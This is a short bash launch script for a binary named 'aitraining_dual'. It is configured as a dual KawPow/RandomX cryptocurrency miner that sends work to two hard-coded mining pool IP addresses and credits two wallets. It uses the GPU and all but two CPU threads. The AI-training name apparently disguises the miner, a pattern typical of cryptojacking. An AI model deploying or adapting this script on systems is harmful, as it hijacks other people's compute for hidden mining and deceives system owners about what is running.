#!/bin/bash
WORKER="$HOSTNAME"
CPU_THREADS=$(($(grep -c '^processor' /proc/cpuinfo) - 2))
export GPU_MAX_HEAP_SIZE=100
export GPU_MAX_USE_SYNC_OBJECTS=1
export GPU_SINGLE_ALLOC_PERCENT=100
export GPU_MAX_ALLOC_PERCENT=100
export GPU_MAX_SINGLE_ALLOC_PERCENT=100
export GPU_ENABLE_LARGE_ALLOCATION=100
export GPU_MAX_WORKGROUP_SIZE=1024
./aitraining_dual \
    --algorithm "kawpow;randomx" \
    --pool "stratum+ssl://51.89.99.172:16161;stratum+ssl://51.222.200.133:10343" \
    --wallet "RM2ciYa3CRqyreRsf25omrB4e1S95waALr;44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd" \
    --worker "$WORKER;$WORKER" \
    --password "x;x" \
    --cpu-threads "0;$CPU_THREADS" \
    --keepalive true
